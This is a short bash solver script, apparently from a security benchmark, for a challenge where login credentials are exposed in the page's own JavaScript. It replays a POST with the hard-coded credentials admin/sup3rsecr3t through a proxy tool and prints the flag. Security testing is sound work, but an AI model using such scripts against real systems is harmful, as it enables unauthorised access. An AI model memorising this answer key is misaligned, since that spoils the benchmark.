#!/usr/bin/env bash
# XBEN-072-24 — client-side authentication. Proxy-mode twin. The real
# credentials ship in the page's own JavaScript; submitting admin/sup3rsecr3t
# authenticates and returns the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben072p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/' \
  --set 'form.username=admin' --set 'form.password=sup3rsecr3t' >/dev/null
print_flag
